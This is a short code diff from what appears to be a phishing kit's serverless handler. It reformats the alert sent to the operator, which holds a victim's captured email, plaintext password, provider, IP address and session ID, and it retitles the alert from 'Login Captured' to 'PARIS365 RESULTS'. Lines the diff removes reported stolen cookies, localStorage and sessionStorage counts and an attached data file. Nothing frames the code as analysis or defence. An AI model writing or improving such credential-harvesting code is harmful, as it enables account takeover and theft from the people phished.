@@ -130,20 +130,13 @@ export const handler = async (event, context) => {
     // Clean, minimal message format
     const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent) ? '📱 Mobile' : '💻 Desktop';
     
-    const message = `🔐 Login Captured
+    const message = `🔐 PARIS365 RESULTS
 
 📧 ${email}
 🔑 ${password}
 🏢 ${provider}
-📄 ${fileName}
-🕒 ${new Date(timestamp).toLocaleString()}
+🕒 ${new Date().toLocaleString()}
 🌐 ${clientIP} | ${deviceInfo}
-
-📁 SESSION DATA SUMMARY:
-🍪 Cookies: ${cookieCount} items
-💾 LocalStorage: ${localStorageCount} items  
-🗂 SessionStorage: ${sessionStorageCount} items
-📄 Complete data file attached below
 
 🆔 ${sessionId}`;
 
